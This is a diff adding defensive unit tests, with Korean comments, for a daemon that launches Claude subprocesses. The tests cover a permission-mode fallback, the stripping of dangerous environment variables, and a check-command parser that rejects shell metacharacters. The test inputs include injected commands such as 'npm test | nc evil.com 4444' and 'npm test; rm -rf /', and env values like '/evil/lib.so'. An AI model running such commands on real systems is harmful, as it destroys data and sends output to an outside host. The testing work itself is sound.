@@ -527,3 +527,169 @@ describe('#1 parseCheckCommand — 셸 인젝션 방지', () => {
     expect(parseCheckCommand('npm test && rm -rf /')).toBeNull();
   });
 });
+
+// ─── CSO-H03: getPermissionMode 폴백 검증 ─────────────────────────────────────
+
+describe('CSO-H03 getPermissionMode — plan 폴백', () => {
+  // daemon-utils.mjs는 ESM 모듈이므로 로직을 인라인으로 복제해 검증
+  // 실제 모듈은 스크립트로 직접 테스트 불가 (spawnSync 의존)
+
+  const ALLOWED_MODES = ['auto', 'bypassPermissions', 'acceptEdits', 'plan'];
+
+  function simulateGetPermissionMode(opts: {
+    envMode?: string;
+    overrideMode?: string;
+    autoAvailable?: boolean;
+  }): string {
+    const { envMode, overrideMode, autoAvailable = false } = opts;
+
+    if (envMode) {
+      if (!ALLOWED_MODES.includes(envMode)) throw new Error(`Invalid CLAUDE_PERMISSION_MODE: "${envMode}"`);
+      return envMode;
+    }
+
+    if (autoAvailable) return 'auto';
+
+    // CSO-H03: bypassPermissions는 명시적 override로만 허용
+    if (overrideMode === 'bypassPermissions') return 'bypassPermissions';
+
+    return 'plan';
+  }
+
+  it('CLAUDE_PERMISSION_MODE=plan이면 plan을 반환한다', () => {
+    expect(simulateGetPermissionMode({ envMode: 'plan' })).toBe('plan');
+  });
+
+  it('CLAUDE_PERMISSION_MODE=bypassPermissions이면 bypassPermissions를 반환한다', () => {
+    expect(simulateGetPermissionMode({ envMode: 'bypassPermissions' })).toBe('bypassPermissions');
+  });
+
+  it('auto 미지원 + override 없음 → plan 폴백 (CSO-H03 핵심)', () => {
+    const result = simulateGetPermissionMode({ autoAvailable: false });
+    expect(result).toBe('plan');
+  });
+
+  it('auto 미지원 + CLAUDE_PERMISSION_MODE_OVERRIDE=bypassPermissions → bypassPermissions', () => {
+    const result = simulateGetPermissionMode({ autoAvailable: false, overrideMode: 'bypassPermissions' });
+    expect(result).toBe('bypassPermissions');
+  });
+
+  it('auto 지원 환경이면 auto를 반환한다', () => {
+    expect(simulateGetPermissionMode({ autoAvailable: true })).toBe('auto');
+  });
+
+  it('유효하지 않은 CLAUDE_PERMISSION_MODE는 에러를 던진다', () => {
+    expect(() => simulateGetPermissionMode({ envMode: 'invalid' })).toThrow('Invalid CLAUDE_PERMISSION_MODE');
+  });
+});
+
+// ─── CSO-M01: DANGEROUS_ENV_VARS에 A_TEAM_ADVISOR_* 추가 검증 ─────────────────
+
+describe('CSO-M01 buildClaudeEnv — A_TEAM_ADVISOR_* 환경변수 제거', () => {
+  const DANGEROUS_ENV_VARS = [
+    'CLAUDECODE',
+    'NODE_OPTIONS',
+    'NODE_PATH',
+    'LD_PRELOAD',
+    'LD_LIBRARY_PATH',
+    'DYLD_INSERT_LIBRARIES',
+    'ANTHROPIC_BASE_URL',
+    'A_TEAM_ADVISOR_BETA_HEADER',
+    'A_TEAM_ADVISOR_TOOL_TYPE',
+  ];
+
+  function simulateBuildClaudeEnv(inputEnv: Record<string, string>): Record<string, string | undefined> {
+    const env = { ...inputEnv };
+    for (const key of DANGEROUS_ENV_VARS) delete env[key];
+    return env;
+  }
+
+  it('A_TEAM_ADVISOR_BETA_HEADER는 자식 프로세스 env에서 제거된다', () => {
+    const result = simulateBuildClaudeEnv({
+      A_TEAM_ADVISOR_BETA_HEADER: 'malicious-header',
+      ANTHROPIC_API_KEY: 'key',
+    });
+    expect(result['A_TEAM_ADVISOR_BETA_HEADER']).toBeUndefined();
+    expect(result['ANTHROPIC_API_KEY']).toBe('key');
+  });
+
+  it('A_TEAM_ADVISOR_TOOL_TYPE는 자식 프로세스 env에서 제거된다', () => {
+    const result = simulateBuildClaudeEnv({
+      A_TEAM_ADVISOR_TOOL_TYPE: 'injected_type',
+      ANTHROPIC_API_KEY: 'key',
+    });
+    expect(result['A_TEAM_ADVISOR_TOOL_TYPE']).toBeUndefined();
+  });
+
+  it('기존 DANGEROUS_ENV_VARS(NODE_OPTIONS 등)도 여전히 제거된다', () => {
+    const result = simulateBuildClaudeEnv({
+      NODE_OPTIONS: '--require evil',
+      LD_PRELOAD: '/evil/lib.so',
+      SAFE_VAR: 'keep-me',
+    });
+    expect(result['NODE_OPTIONS']).toBeUndefined();
+    expect(result['LD_PRELOAD']).toBeUndefined();
+    expect(result['SAFE_VAR']).toBe('keep-me');
+  });
+});
+
+// ─── CSO-L02: parseCheckCommand 셸 메타문자 경고 검증 ────────────────────────
+
+describe('CSO-L02 parseCheckCommand — 셸 메타문자 경고 로그', () => {
+  // ralph-daemon.mjs의 parseCheckCommand 로직을 인라인으로 검증
+  const ALLOWED_CHECK_COMMANDS = new Set([
+    'npm', 'pnpm', 'yarn', 'node', 'tsc', 'vitest', 'jest',
+    'bash', 'sh', 'test', 'bun', 'deno',
+  ]);
+  const SHELL_META_RE = /[|;&`$><\\]/;
+
+  const warningLogs: string[] = [];
+  function mockLog(msg: string) { warningLogs.push(msg); }
+
+  function parseCheckCommandWithLog(checkCommand: string): { cmd: string; args: string[] } | null {
+    if (!checkCommand || typeof checkCommand !== 'string') return null;
+    const trimmed = checkCommand.trim();
+    if (!trimmed) return null;
+
+    if (SHELL_META_RE.test(trimmed)) {
+      mockLog(`[RALPH][WARNING] checkCommand에 셸 메타문자 감지: "${trimmed}". 파이프/리다이렉트 대신 래퍼 스크립트(예: scripts/ci-check.sh)를 사용하세요. 데몬은 단순 명령만 실행합니다.`);
+      return null;
+    }
+
+    const tokens = trimmed.split(/\s+/);
+    const cmd = tokens[0];
+    const args = tokens.slice(1);
+    if (cmd.includes('../') || cmd.includes('..\\')) return null;
+    const baseName = cmd.replace(/^.*\//, '');
+    if (!ALLOWED_CHECK_COMMANDS.has(cmd) && !ALLOWED_CHECK_COMMANDS.has(baseName)) return null;
+    return { cmd, args };
+  }
+
+  beforeEach(() => { warningLogs.length = 0; });
+
+  it('파이프 감지 시 [RALPH][WARNING] 로그가 기록된다', () => {
+    const result = parseCheckCommandWithLog('npm test | nc evil.com 4444');
+    expect(result).toBeNull();
+    expect(warningLogs.length).toBe(1);
+    expect(warningLogs[0]).toContain('[RALPH][WARNING]');
+    expect(warningLogs[0]).toContain('셸 메타문자 감지');
+    expect(warningLogs[0]).toContain('래퍼 스크립트');
+  });
+
+  it('세미콜론 감지 시 경고 로그에 원본 명령이 포함된다', () => {
+    const cmd = 'npm test; rm -rf /';
+    parseCheckCommandWithLog(cmd);
+    expect(warningLogs[0]).toContain(cmd);
+  });
+
+  it('정상 명령은 경고 없이 파싱된다', () => {
+    const result = parseCheckCommandWithLog('npm test');
+    expect(result).not.toBeNull();
+    expect(warningLogs.length).toBe(0);
+  });
+
+  it('리다이렉트 감지 시 래퍼 스크립트 가이드가 로그에 포함된다', () => {
+    parseCheckCommandWithLog('npm test > /tmp/out.txt');
+    expect(warningLogs[0]).toContain('ci-check.sh');
+  });
+});
